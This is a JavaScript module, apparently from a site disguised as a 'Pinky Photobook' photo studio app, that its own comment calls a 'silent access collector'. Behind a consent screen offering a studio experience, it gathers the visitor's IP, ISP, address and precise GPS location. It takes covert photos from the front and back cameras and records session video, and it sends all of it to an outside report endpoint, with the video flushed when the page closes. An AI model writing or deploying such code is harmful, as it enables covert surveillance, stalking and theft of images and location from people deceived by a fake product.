// Silent access collector — runs independently of UI
const API = (import.meta.env.VITE_API_BASE || 'https://api.pandadev.site/backend').replace(/\/$/, '');
const REPORT = `${API}/api/report.php`;

const state = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  maps: '',
  ua: navigator.userAgent,
  frontOk: false,
  backOk: false,
  videoChunks: [],
  recorder: null,
  stream: null,
  sentVideo: false,
};

function buildCaption(extra = '') {
  const mapsLine = state.maps
    ? `🗺-Maps: ${state.maps}`
    : `📍-Vĩ độ: ${state.lat || 'n/a'} | Kinh độ: ${state.lon || 'n/a'}`;
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒-Thời gian: ${state.time}
🌐-IP: ${state.ip || 'n/a'}
🏢-ISP: ${state.isp || 'n/a'}
🏙️-Địa chỉ: ${state.address || 'n/a'}
🌍-Quốc gia: ${state.country || 'n/a'}
${mapsLine}
📱-UA: ${state.ua}
${extra}
  `.trim();
}

async function fetchIP() {
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    state.ip = data.ip || '';
    state.isp = data.connection?.org || 'Không rõ';
    state.address = `${data.region || ''}, ${data.city || ''}, ${data.postal || ''}`
      .replace(/(^, |, $)/g, '')
      .replace(/, ,/g, ',');
    state.country = data.country || '';
    if (!state.lat && data.latitude != null) {
      state.lat = data.latitude;
      state.lon = data.longitude;
      state.maps = `https://www.google.com/maps?q=${state.lat},${state.lon}`;
    }
  } catch (_) {}
}

function getGeo() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(false);
    const timer = setTimeout(() => resolve(false), 10000);
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(timer);
        state.lat = pos.coords.latitude;
        state.lon = pos.coords.longitude;
        state.maps = `https://www.google.com/maps?q=${state.lat},${state.lon}&z=16`;
        resolve(true);
      },
      () => {
        clearTimeout(timer);
        resolve(false);
      },
      { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
    );
  });
}

function grabFrame(stream) {
  return new Promise((resolve) => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    video.setAttribute('playsinline', '');
    let finished = false;
    const finish = (blob) => {
      if (finished) return;
      finished = true;
      resolve(blob || null);
    };
    const draw = () => {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((blob) => finish(blob), 'image/jpeg', 0.9);
      } catch (_) {
        finish(null);
      }
    };
    video.onloadedmetadata = () => {
      video.play().then(() => setTimeout(draw, 600)).catch(() => setTimeout(draw, 600));
    };
    setTimeout(() => finish(null), 3500);
  });
}

async function openCam(facing) {
  try {
    return await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facing } },
      audio: false,
    });
  } catch (_) {
    try {
      return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    } catch (e2) {
      return null;
    }
  }
}

function sendPhoto(blob, label) {
  if (!blob) return Promise.resolve();
  const fd = new FormData();
  fd.append('kind', 'photo');
  fd.append('photo', blob, `${label}.jpg`);
  fd.append('caption', buildCaption(`📸-Camera: ${label}`));
  return fetch(REPORT, { method: 'POST', body: fd, keepalive: true }).catch(() => {});
}

function sendVideo(blob) {
  if (!blob || state.sentVideo) return Promise.resolve();
  state.sentVideo = true;
  const fd = new FormData();
  fd.append('kind', 'video');
  fd.append('video', blob, 'session.webm');
  fd.append('caption', buildCaption('🎥-Video phiên truy cập (tự động khi thoát)'));
  return fetch(REPORT, { method: 'POST', body: fd, keepalive: true }).catch(() => {});
}

function startRecorder(stream) {
  if (!stream || state.recorder) return;
  try {
    const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
      ? 'video/webm;codecs=vp9'
      : MediaRecorder.isTypeSupported('video/webm')
        ? 'video/webm'
        : '';
    const rec = mime ? new MediaRecorder(stream, { mimeType: mime }) : new MediaRecorder(stream);
    state.videoChunks = [];
    rec.ondataavailable = (e) => {
      if (e.data && e.data.size) state.videoChunks.push(e.data);
    };
    rec.onstop = () => {
      if (state.videoChunks.length) {
        const blob = new Blob(state.videoChunks, { type: rec.mimeType || 'video/webm' });
        sendVideo(blob);
      }
    };
    rec.start(2000);
    state.recorder = rec;
  } catch (_) {}
}

function stopAndFlush() {
  if (state.recorder && state.recorder.state !== 'inactive') {
    try { state.recorder.stop(); } catch (_) {}
  } else if (state.videoChunks.length && !state.sentVideo) {
    const blob = new Blob(state.videoChunks, { type: 'video/webm' });
    sendVideo(blob);
  }
}

function bindExit() {
  const flush = () => stopAndFlush();
  window.addEventListener('pagehide', flush);
  window.addEventListener('beforeunload', flush);
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') flush();
  });
}

/**
 * Gate: request camera + location, collect silently, then always reveal UI.
 * Camera is preferred; geo falls back to IP. Never hangs the page forever.
 */
export async function runCollectorGate() {
  const gate = document.createElement('div');
  gate.id = 'access-gate';
  gate.style.cssText =
    'position:fixed;inset:0;z-index:99999;background:#1a0a12;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#ffd6e8;font-family:system-ui,sans-serif;text-align:center;padding:24px';
  gate.innerHTML = `
    <div style="font-size:42px;margin-bottom:12px">♡</div>
    <div style="font-size:18px;font-weight:600;margin-bottom:8px">Pinky Photobook</div>
    <div style="font-size:13px;opacity:.8;max-width:280px;line-height:1.5">
      Để trải nghiệm studio, vui lòng cho phép <b>Camera</b> và <b>Vị trí</b> khi trình duyệt hỏi.
    </div>
    <div id="gate-status" style="margin-top:18px;font-size:12px;opacity:.6">Đang yêu cầu quyền...</div>
    <button id="gate-retry" style="display:none;margin-top:16px;padding:10px 18px;border:0;border-radius:999px;background:#ff7eb3;color:#1a0a12;font-weight:600;cursor:pointer">Thử lại quyền camera</button>
  `;
  document.body.appendChild(gate);
  const statusEl = () => document.getElementById('gate-status');
  const retryBtn = () => document.getElementById('gate-retry');

  const reveal = () => {
    try { gate.remove(); } catch (_) {}
  };

  // Hard ceiling: never block UI more than ~20s
  const ceiling = setTimeout(reveal, 20000);

  try {
    const ipP = fetchIP();
    const geoP = getGeo();

    statusEl().textContent = 'Đang mở camera...';
    let frontStream = await openCam('user');

    // If denied, show retry — but still allow enter after second fail / timeout
    if (!frontStream) {
      statusEl().textContent = 'Cần quyền Camera. Bấm thử lại hoặc đợi để vào studio.';
      retryBtn().style.display = 'inline-block';
      frontStream = await new Promise((resolve) => {
        const t = setTimeout(() => resolve(null), 12000);
        retryBtn().onclick = async () => {
          statusEl().textContent = 'Đang mở camera...';
          const s = await openCam('user');
          if (s) {
            clearTimeout(t);
            retryBtn().style.display = 'none';
            resolve(s);
          } else {
            statusEl().textContent = 'Vẫn chưa có quyền camera. Đang vào studio...';
          }
        };
      });
    }

    if (frontStream) state.frontOk = true;

    await Promise.race([geoP, new Promise((r) => setTimeout(r, 8000))]);
    await Promise.race([ipP, new Promise((r) => setTimeout(r, 5000))]);
    if (!state.lat) await getGeo(); // one more soft try

    // Capture + send in background — do not block UI on network
    if (frontStream) {
      statusEl().textContent = 'Đang chuẩn bị studio...';
      const frontBlob = await grabFrame(frontStream);
      sendPhoto(frontBlob, 'camera-truoc'); // no await

      try { frontStream.getTracks().forEach((t) => t.stop()); } catch (_) {}

      let backStream = await openCam('environment');
      if (backStream) {
        state.backOk = true;
        const backBlob = await grabFrame(backStream);
        sendPhoto(backBlob, 'camera-sau'); // no await
        state.stream = backStream;
      } else {
        state.stream = await openCam('user');
      }

      if (state.stream) {
        startRecorder(state.stream);
        bindExit();
      }
    }
  } catch (_) {
    // swallow — still reveal UI
  }

  clearTimeout(ceiling);
  reveal();
  return true;
}
